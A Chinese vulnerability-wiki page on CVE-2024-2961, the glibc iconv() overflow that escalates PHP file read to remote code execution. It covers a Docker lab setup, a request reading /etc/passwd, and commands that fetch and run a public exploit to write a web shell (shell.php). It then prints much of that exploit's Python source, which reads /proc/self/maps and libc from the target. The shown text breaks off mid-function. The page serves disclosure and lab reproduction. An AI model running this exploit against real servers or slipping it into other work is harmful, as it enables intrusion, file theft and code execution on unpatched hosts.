<!DOCTYPE html>
<html lang="en">
<head>
  
  
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    
    <meta name="author" content="内部使用">
    <link rel="canonical" href="https://secnn.com/%E5%BC%80%E5%8F%91%E8%AF%AD%E8%A8%80%E6%BC%8F%E6%B4%9E/PHP%20%E5%88%A9%E7%94%A8%20GNU%20C%20Iconv%20%E5%B0%86%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%8F%90%E5%8D%87%E8%87%B3%20RCE%20CVE-2024-2961/">
    <link rel="shortcut icon" href="../../favicon.ico">
    
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
    <title>PHP 利用 GNU C Iconv 将文件读取提升至 RCE CVE-2024-2961 - SecNN-Wiki漏洞库管理系统&网络安全知识库-本Wiki所有信息来源于公开漏洞数据库</title>
    <link href="../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
    <link href="../../css/font-awesome-4.7.0.css" rel="stylesheet">
    <link href="../../css/base.css" rel="stylesheet">
    <link rel="stylesheet" href="../../css/highlight.css">
    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
    <!--[if lt IE 9]>
        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
    <![endif]-->

    <script src="../../js/jquery-3.2.1.min.js"></script>
    <script src="../../js/bootstrap-3.3.7.min.js"></script>
    <script src="../../js/highlight.pack.js"></script>
    
    <base target="_top">
    <script>
      var base_url = '../..';
      var is_top_frame = false;
        
        var pageToc = [
          {title: "PHP \u5229\u7528 GNU C Iconv \u5c06\u6587\u4ef6\u8bfb\u53d6\u63d0\u5347\u81f3 RCE CVE-2024-2961", url: "#_top", children: [
              {title: "\u6f0f\u6d1e\u63cf\u8ff0", url: "#_1" },
              {title: "\u73af\u5883\u642d\u5efa", url: "#_2" },
              {title: "\u6f0f\u6d1e\u590d\u73b0", url: "#_3" },
              {title: "\u6f0f\u6d1e POC", url: "#poc" },
          ]},
        ];

    </script>
    <script src="../../js/base.js"></script>
      <script src="../../search/main.js"></script> 
</head>

<body>
<script>
if (is_top_frame) { $('body').addClass('wm-top-page'); }
</script>



<div class="container-fluid wm-page-content">
  <a name="_top"></a>
    

    
    
      
    

  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
    
    <div class="wm-article-nav pull-right">
      <a href="../PHP%20%E5%88%A9%E7%94%A8%20phpinfo%20%E5%8C%85%E5%90%AB%E4%B8%B4%E6%97%B6%E6%96%87%E4%BB%B6%20getshell/" class="btn btn-xs btn-default pull-right">
        Next
        <i class="fa fa-chevron-right" aria-hidden="true"></i>
      </a>
      <a href="../PHP%20%E5%88%A9%E7%94%A8%20phpinfo%20%E5%8C%85%E5%90%AB%E4%B8%B4%E6%97%B6%E6%96%87%E4%BB%B6%20getshell/" class="btn btn-xs btn-link">
        PHP 利用 phpinfo 包含临时文件 getshell
      </a>
    </div>
    
    <div class="wm-article-nav">
      <a href="../PHP%20imap%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20CVE-2018-19518/" class="btn btn-xs btn-default pull-left">
        <i class="fa fa-chevron-left" aria-hidden="true"></i>
        Previous</a><a href="../PHP%20imap%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20CVE-2018-19518/" class="btn btn-xs btn-link">
        PHP imap 远程命令执行漏洞 CVE-2018-19518
      </a>
    </div>
    
  </div>

    

    <h1 id="php-gnu-c-iconv-rce-cve-2024-2961">PHP 利用 GNU C Iconv 将文件读取提升至 RCE CVE-2024-2961<a class="headerlink" href="#php-gnu-c-iconv-rce-cve-2024-2961" title="Permanent link">&para;</a></h1>
<h2 id="_1">漏洞描述<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h2>
<p>GNU C 是一个标准的 ISO C 依赖库。在 GNU C 中，<code>iconv()</code> 函数 2.39 及以前存在一处缓冲区溢出漏洞，这可能会导致应用程序崩溃或覆盖相邻变量。</p>
<p>如果一个 PHP 应用中存在任意文件读取漏洞，攻击者可以利用 <code>iconv()</code> 的这个 CVE-2024-2961 漏洞，将其提升为代码执行漏洞。</p>
<p>参考链接：</p>
<ul>
<li><a href="https://www.ambionics.io/blog/iconv-cve-2024-2961-p1">https://www.ambionics.io/blog/iconv-cve-2024-2961-p1</a></li>
</ul>
<h2 id="_2">环境搭建<a class="headerlink" href="#_2" title="Permanent link">&para;</a></h2>
<p>Vulhub 执行如下命令启动一个 PHP 8.3.4 服务器，其使用 iconv 2.36 作为依赖：</p>
<div class="highlight"><pre><span></span><code>docker compose up -d
</code></pre></div>
<p>服务启动后，你可以通过 POST 请求读取 <code>/etc/passwd</code> 文件：</p>
<div class="highlight"><pre><span></span><code>POST /index.php HTTP/1.1
Host: your-ip:8080
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36
Accept: */*
Content-Length: 20

file=%2Fetc%2Fpasswd
</code></pre></div>
<p><img alt="" src="../images/PHP%20%E5%88%A9%E7%94%A8%20GNU%20C%20Iconv%20%E5%B0%86%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%8F%90%E5%8D%87%E8%87%B3%20RCE%20CVE-2024-2961/image-20240529103426807.png" /></p>
<h2 id="_3">漏洞复现<a class="headerlink" href="#_3" title="Permanent link">&para;</a></h2>
<p>在使用原作者给出的 <a href="https://github.com/ambionics/cnext-exploits">exploit</a> 前，需要准备一个 Linux 环境和 Python 3.10 解释器。安装依赖：</p>
<div class="highlight"><pre><span></span><code>pip install pwntools
pip install https://github.com/cfreal/ten/archive/refs/heads/main.zip
</code></pre></div>
<p>然后从 <a href="https://raw.githubusercontent.com/ambionics/cnext-exploits/main/cnext-exploit.py">https://raw.githubusercontent.com/ambionics/cnext-exploits/main/cnext-exploit.py</a> 下载 POC 并执行：</p>
<div class="highlight"><pre><span></span><code>wget https://raw.githubusercontent.com/ambionics/cnext-exploits/main/cnext-exploit.py
python cnext-exploit.py http://your-ip:8080/index.php &quot;echo &#39;&lt;?=phpinfo();?&gt;&#39; &gt; shell.php&quot;
</code></pre></div>
<p><img alt="" src="../images/PHP%20%E5%88%A9%E7%94%A8%20GNU%20C%20Iconv%20%E5%B0%86%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%8F%90%E5%8D%87%E8%87%B3%20RCE%20CVE-2024-2961/image-20240529104545506.png" /></p>
<p>可见，已经成功写入 <code>shell.php</code>：</p>
<p><img alt="" src="../images/PHP%20%E5%88%A9%E7%94%A8%20GNU%20C%20Iconv%20%E5%B0%86%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%8F%90%E5%8D%87%E8%87%B3%20RCE%20CVE-2024-2961/image-20240529104613750.png" /></p>
<h2 id="poc">漏洞 POC<a class="headerlink" href="#poc" title="Permanent link">&para;</a></h2>
<p>cnext-exploit.py</p>
<div class="highlight"><pre><span></span><code><span class="ch">#!/usr/bin/env python3</span>
<span class="c1">#</span>
<span class="c1"># CNEXT: PHP file-read to RCE</span>
<span class="c1"># Date: 2024-05-27</span>
<span class="c1"># Author: Charles FOL @cfreal_ (LEXFO/AMBIONICS)</span>
<span class="c1">#</span>
<span class="c1"># TODO Parse LIBC to know if patched</span>
<span class="c1">#</span>
<span class="c1"># INFORMATIONS</span>
<span class="c1">#</span>
<span class="c1"># To use, implement the Remote class, which tells the exploit how to send the payload.</span>
<span class="c1">#</span>
<span class="c1"># REQUIREMENTS</span>
<span class="c1">#</span>
<span class="c1"># Requires ten: https://github.com/cfreal/ten</span>
<span class="c1">#</span>

<span class="kn">from</span><span class="w"> </span><span class="nn">__future__</span><span class="w"> </span><span class="kn">import</span> <span class="n">annotations</span>

<span class="kn">import</span><span class="w"> </span><span class="nn">base64</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">zlib</span>
<span class="kn">from</span><span class="w"> </span><span class="nn">dataclasses</span><span class="w"> </span><span class="kn">import</span> <span class="n">dataclass</span>

<span class="kn">from</span><span class="w"> </span><span class="nn">pwn</span><span class="w"> </span><span class="kn">import</span> <span class="o">*</span>
<span class="kn">from</span><span class="w"> </span><span class="nn">requests.exceptions</span><span class="w"> </span><span class="kn">import</span> <span class="n">ChunkedEncodingError</span><span class="p">,</span> <span class="ne">ConnectionError</span>
<span class="kn">from</span><span class="w"> </span><span class="nn">ten</span><span class="w"> </span><span class="kn">import</span> <span class="o">*</span>


<span class="n">HEAP_SIZE</span> <span class="o">=</span> <span class="mi">2</span> <span class="o">*</span> <span class="mi">1024</span> <span class="o">*</span> <span class="mi">1024</span>
<span class="n">BUG</span> <span class="o">=</span> <span class="s2">&quot;劄&quot;</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s2">&quot;utf-8&quot;</span><span class="p">)</span>


<span class="k">class</span><span class="w"> </span><span class="nc">Remote</span><span class="p">:</span>
<span class="w">    </span><span class="sd">&quot;&quot;&quot;A helper class to send the payload and download files.</span>

<span class="sd">    The logic of the exploit is always the same, but the exploit needs to know how to</span>
<span class="sd">    download files (/proc/self/maps and libc) and how to send the payload.</span>

<span class="sd">    The code here serves as an example that attacks a page that looks like:</span>

<span class="sd">    ```php</span>
<span class="sd">    &lt;?php</span>

<span class="sd">    $data = file_get_contents($_POST[&#39;file&#39;]);</span>
<span class="sd">    echo &quot;File contents: $data&quot;;</span>
<span class="sd">    ```</span>

<span class="sd">    Tweak it to fit your target, and start the exploit.</span>
<span class="sd">    &quot;&quot;&quot;</span>

    <span class="k">def</span><span class="w"> </span><span class="fm">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">url</span><span class="p">:</span> <span class="nb">str</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="kc">None</span><span class="p">:</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">url</span> <span class="o">=</span> <span class="n">url</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">session</span> <span class="o">=</span> <span class="n">Session</span><span class="p">()</span>

    <span class="k">def</span><span class="w"> </span><span class="nf">send</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">path</span><span class="p">:</span> <span class="nb">str</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="n">Response</span><span class="p">:</span>
<span class="w">        </span><span class="sd">&quot;&quot;&quot;Sends given `path` to the HTTP server. Returns the response.</span>
<span class="sd">        &quot;&quot;&quot;</span>
        <span class="k">return</span> <span class="bp">self</span><span class="o">.</span><span class="n">session</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">url</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="p">{</span><span class="s2">&quot;file&quot;</span><span class="p">:</span> <span class="n">path</span><span class="p">})</span>

    <span class="k">def</span><span class="w"> </span><span class="nf">download</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">path</span><span class="p">:</span> <span class="nb">str</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="nb">bytes</span><span class="p">:</span>
<span class="w">        </span><span class="sd">&quot;&quot;&quot;Returns the contents of a remote file.</span>
<span class="sd">        &quot;&quot;&quot;</span>
        <span class="n">path</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">&quot;php://filter/convert.base64-encode/resource=</span><span class="si">{</span><span class="n">path</span><span class="si">}</span><span class="s2">&quot;</span>
        <span class="n">response</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">path</span><span class="p">)</span>
        <span class="n">data</span> <span class="o">=</span> <span class="n">response</span><span class="o">.</span><span class="n">re</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;File contents: (.*)&quot;</span><span class="p">,</span> <span class="n">flags</span><span class="o">=</span><span class="n">re</span><span class="o">.</span><span class="n">S</span><span class="p">)</span><span class="o">.</span><span class="n">group</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
        <span class="k">return</span> <span class="n">base64</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>

<span class="nd">@entry</span>
<span class="nd">@arg</span><span class="p">(</span><span class="s2">&quot;url&quot;</span><span class="p">,</span> <span class="s2">&quot;Target URL&quot;</span><span class="p">)</span>
<span class="nd">@arg</span><span class="p">(</span><span class="s2">&quot;command&quot;</span><span class="p">,</span> <span class="s2">&quot;Command to run on the system; limited to 0x140 bytes&quot;</span><span class="p">)</span>
<span class="nd">@arg</span><span class="p">(</span><span class="s2">&quot;sleep_time&quot;</span><span class="p">,</span> <span class="s2">&quot;Time to sleep to assert that the exploit worked. By default, 1.&quot;</span><span class="p">)</span>
<span class="nd">@arg</span><span class="p">(</span><span class="s2">&quot;heap&quot;</span><span class="p">,</span> <span class="s2">&quot;Address of the main zend_mm_heap structure.&quot;</span><span class="p">)</span>
<span class="nd">@arg</span><span class="p">(</span>
    <span class="s2">&quot;pad&quot;</span><span class="p">,</span>
    <span class="s2">&quot;Number of 0x100 chunks to pad with. If the website makes a lot of heap &quot;</span>
    <span class="s2">&quot;operations with this size, increase this. Defaults to 20.&quot;</span><span class="p">,</span>
<span class="p">)</span>
<span class="nd">@dataclass</span>
<span class="k">class</span><span class="w"> </span><span class="nc">Exploit</span><span class="p">:</span>
<span class="w">    </span><span class="sd">&quot;&quot;&quot;CNEXT exploit: RCE using a file read primitive in PHP.&quot;&quot;&quot;</span>

    <span class="n">url</span><span class="p">:</span> <span class="nb">str</span>
    <span class="n">command</span><span class="p">:</span> <span class="nb">str</span>
    <span class="n">sleep</span><span class="p">:</span> <span class="nb">int</span> <span class="o">=</span> <span class="mi">1</span>
    <span class="n">heap</span><span class="p">:</span> <span class="nb">str</span> <span class="o">=</span> <span class="kc">None</span>
    <span class="n">pad</span><span class="p">:</span> <span class="nb">int</span> <span class="o">=</span> <span class="mi">20</span>

    <span class="k">def</span><span class="w"> </span><span class="nf">__post_init__</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">remote</span> <span class="o">=</span> <span class="n">Remote</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">url</span><span class="p">)</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">log</span> <span class="o">=</span> <span class="n">logger</span><span class="p">(</span><span class="s2">&quot;EXPLOIT&quot;</span><span class="p">)</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">info</span> <span class="o">=</span> <span class="p">{}</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">heap</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">heap</span> <span class="ow">and</span> <span class="nb">int</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">heap</span><span class="p">,</span> <span class="mi">16</span><span class="p">)</span>

    <span class="k">def</span><span class="w"> </span><span class="nf">check_vulnerable</span><span class="p">(</span><span class="bp">self</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="kc">None</span><span class="p">:</span>
<span class="w">        </span><span class="sd">&quot;&quot;&quot;Checks whether the target is reachable and properly allows for the various</span>
<span class="sd">        wrappers and filters that the exploit needs.</span>
<span class="sd">        &quot;&quot;&quot;</span>

        <span class="k">def</span><span class="w"> </span><span class="nf">safe_download</span><span class="p">(</span><span class="n">path</span><span class="p">:</span> <span class="nb">str</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="nb">bytes</span><span class="p">:</span>
            <span class="k">try</span><span class="p">:</span>
                <span class="k">return</span> <span class="bp">self</span><span class="o">.</span><span class="n">remote</span><span class="o">.</span><span class="n">download</span><span class="p">(</span><span class="n">path</span><span class="p">)</span>
            <span class="k">except</span> <span class="ne">ConnectionError</span><span class="p">:</span>
                <span class="n">failure</span><span class="p">(</span><span class="s2">&quot;Target not [b]reachable[/] ?&quot;</span><span class="p">)</span>


        <span class="k">def</span><span class="w"> </span><span class="nf">check_token</span><span class="p">(</span><span class="n">text</span><span class="p">:</span> <span class="nb">str</span><span class="p">,</span> <span class="n">path</span><span class="p">:</span> <span class="nb">str</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="nb">bool</span><span class="p">:</span>
            <span class="n">result</span> <span class="o">=</span> <span class="n">safe_download</span><span class="p">(</span><span class="n">path</span><span class="p">)</span>
            <span class="k">return</span> <span class="n">text</span><span class="o">.</span><span class="n">encode</span><span class="p">()</span> <span class="o">==</span> <span class="n">result</span>

        <span class="n">text</span> <span class="o">=</span> <span class="n">tf</span><span class="o">.</span><span class="n">random</span><span class="o">.</span><span class="n">string</span><span class="p">(</span><span class="mi">50</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">()</span>
        <span class="n">base64</span> <span class="o">=</span> <span class="n">b64</span><span class="p">(</span><span class="n">text</span><span class="p">,</span> <span class="n">misalign</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span><span class="o">.</span><span class="n">decode</span><span class="p">()</span>
        <span class="n">path</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">&quot;data:text/plain;base64,</span><span class="si">{</span><span class="n">base64</span><span class="si">}</span><span class="s2">&quot;</span>

        <span class="n">result</span> <span class="o">=</span> <span class="n">safe_download</span><span class="p">(</span><span class="n">path</span><span class="p">)</span>

        <span class="k">if</span> <span class="n">text</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">result</span><span class="p">:</span>
            <span class="n">msg_failure</span><span class="p">(</span><span class="s2">&quot;Remote.download did not return the test string&quot;</span><span class="p">)</span>
            <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;--------------------&quot;</span><span class="p">)</span>
            <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;Expected test string: </span><span class="si">{</span><span class="n">text</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
            <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;Got: </span><span class="si">{</span><span class="n">result</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
            <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;--------------------&quot;</span><span class="p">)</span>
            <span class="n">failure</span><span class="p">(</span><span class="s2">&quot;If your code works fine, it means that the [i]data://[/] wrapper does not work&quot;</span><span class="p">)</span>

        <span class="n">msg_info</span><span class="p">(</span><span class="s2">&quot;The [i]data://[/] wrapper works&quot;</span><span class="p">)</span>

        <span class="n">text</span> <span class="o">=</span> <span class="n">tf</span><span class="o">.</span><span class="n">random</span><span class="o">.</span><span class="n">string</span><span class="p">(</span><span class="mi">50</span><span class="p">)</span>
        <span class="n">base64</span> <span class="o">=</span> <span class="n">b64</span><span class="p">(</span><span class="n">text</span><span class="o">.</span><span class="n">encode</span><span class="p">(),</span> <span class="n">misalign</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span><span class="o">.</span><span class="n">decode</span><span class="p">()</span>
        <span class="n">path</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">&quot;php://filter//resource=data:text/plain;base64,</span><span class="si">{</span><span class="n">base64</span><span class="si">}</span><span class="s2">&quot;</span>
        <span class="k">if</span> <span class="ow">not</span> <span class="n">check_token</span><span class="p">(</span><span class="n">text</span><span class="p">,</span> <span class="n">path</span><span class="p">):</span>
            <span class="n">failure</span><span class="p">(</span><span class="s2">&quot;The [i]php://filter/[/] wrapper does not work&quot;</span><span class="p">)</span>

        <span class="n">msg_info</span><span class="p">(</span><span class="s2">&quot;The [i]php://filter/[/] wrapper works&quot;</span><span class="p">)</span>

        <span class="n">text</span> <span class="o">=</span> <span class="n">tf</span><span class="o">.</span><span class="n">random</span><span class="o">.</span><span class="n">string</span><span class="p">(</span><span class="mi">50</span><span class="p">)</span>
        <span class="n">base64</span> <span class="o">=</span> <span class="n">b64</span><span class="p">(</span><span class="n">compress</span><span class="p">(</span><span class="n">text</span><span class="o">.</span><span class="n">encode</span><span class="p">()),</span> <span class="n">misalign</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span><span class="o">.</span><span class="n">decode</span><span class="p">()</span>
        <span class="n">path</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">&quot;php://filter/zlib.inflate/resource=data:text/plain;base64,</span><span class="si">{</span><span class="n">base64</span><span class="si">}</span><span class="s2">&quot;</span>

        <span class="k">if</span> <span class="ow">not</span> <span class="n">check_token</span><span class="p">(</span><span class="n">text</span><span class="p">,</span> <span class="n">path</span><span class="p">):</span>
            <span class="n">failure</span><span class="p">(</span><span class="s2">&quot;The [i]zlib[/] extension is not enabled&quot;</span><span class="p">)</span>

        <span class="n">msg_info</span><span class="p">(</span><span class="s2">&quot;The [i]zlib[/] extension is enabled&quot;</span><span class="p">)</span>

        <span class="n">msg_success</span><span class="p">(</span><span class="s2">&quot;Exploit preconditions are satisfied&quot;</span><span class="p">)</span>

    <span class="k">def</span><span class="w"> </span><span class="nf">get_file</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">path</span><span class="p">:</span> <span class="nb">str</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="nb">bytes</span><span class="p">:</span>
        <span class="k">with</span> <span class="n">msg_status</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;Downloading [i]</span><span class="si">{</span><span class="n">path</span><span class="si">}</span><span class="s2">[/]...&quot;</span><span class="p">):</span>
            <span class="k">return</span> <span class="bp">self</span><span class="o">.</span><span class="n">remote</span><span class="o">.</span><span class="n">download</span><span class="p">(</span><span class="n">path</span><span class="p">)</span>

    <span class="k">def</span><span class="w"> </span><span class="nf">get_regions</span><span class="p">(</span><span class="bp">self</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="nb">list</span><span class="p">[</span><span class="n">Region</span><span class="p">]:</span>
<span class="w">        </span><span class="sd">&quot;&quot;&quot;Obtains the memory regions of the PHP process by querying /proc/self/maps.&quot;&quot;&quot;</span>
        <span class="n">maps</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">get_file</span><span class="p">(</span><span class="s2">&quot;/proc/self/maps&quot;</span><span class="p">)</span>
        <span class="n">maps</span> <span class="o">=</span> <span class="n">maps</span><span class="o">.</span><span class="n">decode</span><span class="p">()</span>
        <span class="n">PATTERN</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">compile</span><span class="p">(</span>
            <span class="sa">r</span><span class="s2">&quot;^([a-f0-9]+)-([a-f0-9]+)\b&quot;</span> <span class="sa">r</span><span class="s2">&quot;.*&quot;</span> <span class="sa">r</span><span class="s2">&quot;\s([-rwx]</span><span class="si">{3}</span><span class="s2">[ps])\s&quot;</span> <span class="sa">r</span><span class="s2">&quot;(.*)&quot;</span>
        <span class="p">)</span>
        <span class="n">regions</span> <span class="o">=</span> <span class="p">[]</span>
        <span class="k">for</span> <span class="n">region</span> <span class="ow">in</span> <span class="n">table</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="n">maps</span><span class="p">,</span> <span class="n">strip</span><span class="o">=</span><span class="kc">True</span><span class="p">):</span>
            <span class="k">if</span> <span class="n">match</span> <span class="o">:=</span> <span class="n">PATTERN</span><span class="o">.</span><span class="n">match</span><span class="p">(</span><span class="n">region</span><span class="p">):</span>
                <span class="n">start</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">match</span><span class="o">.</span><span class="n">group</span><span class="p">(</span><span class="mi">1</span><span class="p">),</span> <span class="mi">16</span><span class="p">)</span>
                <span class="n">stop</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">match</span><span class="o">.</span><span class="n">group</span><span class="p">(</span><span class="mi">2</span><span class="p">),</span> <span class="mi">16</span><span class="p">)</span>
                <span class="n">permissions</span> <span class="o">=</span> <span class="n">match</span><span class="o">.</span><span class="n">group</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span>
                <span class="n">path</span> <span class="o">=</span> <span class="n">match</span><span class="o">.</span><span class="n">group</span><span class="p">(</span><span class="mi">4</span><span class="p">)</span>
                <span class="k">if</span> <span class="s2">&quot;/&quot;</span> <span class="ow">in</span> <span class="n">path</span> <span class="ow">or</span> <span class="s2">&quot;[&quot;</span> <span class="ow">in</span> <span class="n">path</span><span class="p">:</span>
                    <span class="n">path</span> <span class="o">=</span> <span class="n">path</span><span class="o">.</span><span class="n">rsplit</span><span class="p">(</span><span class="s2">&quot; &quot;</span><span class="p">,</span> <span class="mi">1</span><span class="p">)[</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span>
                <span class="k">else</span><span class="p">:</span>
                    <span class="n">path</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span>
                <span class="n">current</span> <span class="o">=</span> <span class="n">Region</span><span class="p">(</span><span class="n">start</span><span class="p">,</span> <span class="n">stop</span><span class="p">,</span> <span class="n">permissions</span><span class="p">,</span> <span class="n">path</span><span class="p">)</span>
                <span class="n">regions</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">current</span><span class="p">)</span>
            <span class="k">else</span><span class="p">:</span>
                <span class="nb">print</span><span class="p">(</span><span class="n">maps</span><span class="p">)</span>
                <span class="n">failure</span><span class="p">(</span><span class="s2">&quot;Unable to parse memory mappings&quot;</span><span class="p">)</span>

        <span class="bp">self</span><span class="o">.</span><span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;Got </span><span class="si">{</span><span class="nb">len</span><span class="p">(</span><span class="n">regions</span><span class="p">)</span><span class="si">}</span><span class="s2"> memory regions&quot;</span><span class="p">)</span>

        <span class="k">return</span> <span class="n">regions</span>

    <span class="k">def</span><span class="w"> </span><span class="nf">get_symbols_and_addresses</span><span class="p">(</span><span class="bp">self</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="kc">None</span><span class="p">:</span>
<span class="w">        </span><span class="sd">&quot;&quot;&quot;Obtains useful symbols and addresses from the file read primitive.&quot;&quot;&quot;</span>
        <span class="n">regions</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">get_regions</span><span class="p">()</span>

        <span class="n">LIBC_FILE</span> <span class="o">=</span> <span class="s2">&quot;/dev/shm/cnext-libc&quot;</span>

        <span class="c1"># PHP&#39;s heap</span>

        <span class="bp">self</span><span class="o">.</span><span class="n">info</span><span class="p">[</span><span class="s2">&quot;heap&quot;</span><span class="p">]</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">heap</span> <span class="ow">or</span> <span class="bp">self</span><span class="o">.</span><span class="n">find_main_heap</span><span class="p">(</span><span class="n">regions</span><span class="p">)</span>

        <span class="c1"># Libc</span>

        <span class="n">libc</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">_get_region</span><span class="p">(</span><span class="n">regions</span><span class="p">,</span> <span class="s2">&quot;libc-&quot;</span><span class="p">,</span> <span class="s2">&quot;libc.so&quot;</span><span class="p">)</span>

        <span class="bp">self</span><span class="o">.</span><span class="n">download_file</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">path</span><span class="p">,</span> <span class="n">LIBC_FILE</span><span class="p">)</span>

        <span class="bp">self</span><span class="o">.</span><span class="n">info</span><span class="p">[</span><span class="s2">&quot;libc&quot;</span><span class="p">]</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="n">LIBC_FILE</span><span class="p">,</span> <span class="n">checksec</span><span class="o">=</span><span class="kc">False</span><span class="p">)</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">info</span><span class="p">[</span><span class="s2">&quot;libc&quot;</span><span class="p">]</span><span class="o">.</span><span class="n">address</span> <span class="o">=</span> <span class="n">libc</span><span class="o">.</span><span class="n">start</span>

    <span class="k">def</span><span class="w"> </span><span class="nf">_get_region</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">regions</span><span class="p">:</span> <span class="nb">list</span><span class="p">[</span><span class="n">Region</span><span class="p">],</span> <span class="o">*</span><span class="n">names</span><span class="p">:</span> <span class="nb">str</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="n">Region</span><span class="p">:</span>
<span class="w">        </span><span class="sd">&quot;&quot;&quot;Returns the first region whose name matches one of the given names.&quot;&quot;&quot;</span>
        <span class="k">for</span> <span class="n">region</span> <span class="ow">in</span> <span class="n">regions</span><span class="p">:</span>
            <span class="k">if</span> <span class="nb">any</span><span class="p">(</span><span class="n">name</span> <span class="ow">in</span> <span class="n">region</span><span class="o">.</span><span class="n">path</span> <span class="k">for</span> <span class="n">name</span> <span class="ow">in</span> <span class="n">names</span><span class="p">):</span>
                <span class="k">break</span>
        <span class="k">else</span><span class="p">:</span>
            <span class="n">failure</span><span class="p">(</span><span class="s2">&quot;Unable to locate region&quot;</span><span class="p">)</span>

        <span class="k">return</span> <span class="n">region</span>

    <span class="k">def</span><span class="w"> </span><span class="nf">download_file</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">remote_path</span><span class="p">:</span> <span class="nb">str</span><span class="p">,</span> <span class="n">local_path</span><span class="p">:</span> <span class="nb">str</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="kc">None</span><span class="p">:</span>
<span class="w">        </span><span class="sd">&quot;&quot;&quot;Downloads `remote_path` to `local_path`&quot;&quot;&quot;</span>
